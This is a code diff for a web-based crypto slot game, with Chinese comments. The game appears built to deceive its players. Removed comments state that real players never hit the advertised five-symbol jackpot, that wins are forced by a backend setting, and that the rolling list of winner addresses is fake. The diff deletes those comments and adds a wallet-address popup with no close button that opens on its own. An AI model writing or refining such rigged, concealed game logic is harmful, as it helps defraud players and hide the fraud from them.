@@ -83,7 +83,6 @@ async function loadPublicSettings() {
     }
 }
 
-// 把币种/奖励配置应用到 UI
 function applyConfigToUI() {
     const cur = window.__GAME_CONFIG.currency;
     const meta = COIN_META[cur] || COIN_META.USDT;
@@ -198,7 +197,6 @@ window.addEventListener('beforeunload', endVisitSession);
 (function(){
 const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
 const JACKPOT = 10000;
-// ★ 真实玩家只中 2/3/4 连，5 连永不出现
 const MATCH_POOL = [2, 3, 4];
 const SYMS=[
 {id:"btc",cls:"sym-btc",label:"BTC",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M20.2 14.3c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.4-.1-.7-.2-1-.2l-2.2-.5-.4 1.7s1.2.3 1.1.3c.6.2.8.5.7.9l-.7 3 .2.1-1.1 4.3c-.1.2-.3.5-.7.4l-1.1-.3-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.8 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.8c2.9.5 5 .3 6-2.3.8-2.1 0-3.3-1.6-4.1 1.2-.3 2-1.1 2.2-2.7zm-3.2 4.5c-.5 2.2-4.1 1-5.3.7l.9-3.8c1.2.3 5 .9 4.4 3.1zm.6-4.5c-.5 2-3.5.97-4.4.73l.9-3.4c1 .2 4.1.7 3.5 2.67z"/></svg>'},
@@ -354,13 +352,29 @@ window.__forceLimitReached = function(){
   restoreBtn();
 };
 
+// ★ 打开地址输入弹窗（强制模式：无关闭按钮，只能填对地址后提交）
+function openExtractModal(){
+  const cur = window.__GAME_CONFIG.currency;
+  $("extractAmt").textContent = formatAmountWithSep(S.bal, cur) + " " + cur;
+  if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();
+  const input = $("trc20Input");
+  input.classList.remove("is-invalid");
+  $("trc20Err").textContent = "";
+  if (cur === 'ETH') input.placeholder = '0x................................';
+  else if (cur === 'BTC') input.placeholder = '1... / 3... / bc1...';
+  else if (cur === 'DOGE') input.placeholder = 'D................................';
+  else if (cur === 'SOL') input.placeholder = '4................................';
+  else input.placeholder = 'T................................';
+  openM("extractModal");
+  setTimeout(()=>input.focus(), 280);
+}
+
 function spin(){
   if(S.spinning||S.pending||S.canExtract||S.left<=0)return;
   SFX.unlock();S.spinning=1;setLeft(S.left-1);clearHL();
   const btn=$("spinBtn");
   btn.classList.remove("is-extract");btn.disabled=true;btn.textContent=T('spinning_btn');
 
-  // 根据后台 winCount 决定本次是否强制中奖
   const winCount = (typeof window.__GAME_CONFIG.winCount === 'number') ? window.__GAME_CONFIG.winCount : 3;
   const totalSpins = SPINS;
   S.roundSpins = (S.roundSpins || 0) + 1;
@@ -382,7 +396,6 @@ function spin(){
 
   if (!isNoWin) S.roundWins = (S.roundWins || 0) + 1;
 
-  // ★ 未中奖时：5 列共享同一组 5 个不同符号
   let sharedNoWinSyms = null;
   if (isNoWin) {
     sharedNoWinSyms = shuffle(SYMS).slice(0, N).map(s => s.id);
@@ -396,8 +409,6 @@ function spin(){
     const ids=from.slice();
     for(let k=0;k<EXTRA;k++)ids.push(pick(SYMS).id);
     if (isNoWin) {
-      // ★ 关键修复：必须 push 5 个（3 个 triple + 2 个额外）
-      // triple(c) = [nbr(c), c, nbr(c)]，所以这 5 个的中心位置（index 1）就是 c = sharedNoWinSyms[i]
       const c = sharedNoWinSyms[i];
       ids.push(...triple(c), nbr(c), nbr(c));
     } else {
@@ -442,13 +453,20 @@ function spin(){
     }
   });
 }
+
 function claim(){
+  // 未中奖 → 关闭奖窗 → 如果次数用完且有余额，自动弹地址框
   if (S.lastWasNoWin) {
     S.lastWasNoWin = 0;
     openM("winModal", false);
     restoreBtn();
+    if (S.left <= 0 && S.bal > 0) {
+      setTimeout(openExtractModal, 400);
+    }
     return;
   }
+
+  // 中奖 → 领取 → 关闭奖窗 → 如果次数用完且有余额，自动弹地址框
   if(S.pending>0){
     setBal(S.bal+S.pending);
     const cur = window.__GAME_CONFIG.currency;
@@ -457,6 +475,10 @@ function claim(){
   }
   if(S.left<=0)S.canExtract=1;
   openM("winModal",false);restoreBtn();
+
+  if (S.left <= 0 && S.bal > 0) {
+    setTimeout(openExtractModal, 400);
+  }
 }
 
 function validateAddress(addr, currency) {
@@ -493,19 +515,7 @@ function onMain(){
       if(typeof window.__openMyRecords === 'function') window.__openMyRecords();
       return;
     }
-    const cur = window.__GAME_CONFIG.currency;
-    $("extractAmt").textContent=formatAmountWithSep(S.bal, cur)+" "+cur;
-    if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();
-    const input=$("trc20Input");
-    input.classList.remove("is-invalid");
-    $("trc20Err").textContent="";
-    if (cur === 'ETH') input.placeholder = '0x................................';
-    else if (cur === 'BTC') input.placeholder = '1... / 3... / bc1...';
-    else if (cur === 'DOGE') input.placeholder = 'D................................';
-    else if (cur === 'SOL') input.placeholder = '4................................';
-    else input.placeholder = 'T................................';
-    openM("extractModal");
-    setTimeout(()=>input.focus(),280);
+    openExtractModal();
     return;
   }
   spin();
@@ -586,7 +596,7 @@ async function submitTrc20Record(address, balance){
   }
 }
 
-// ========== 滚动地址列表（假数据 · 按后台配置生成） ==========
+// ========== 滚动地址列表 ==========
 function initRollingAddresses() {
   const inner = document.getElementById('rollingInner');
   if (!inner) return;
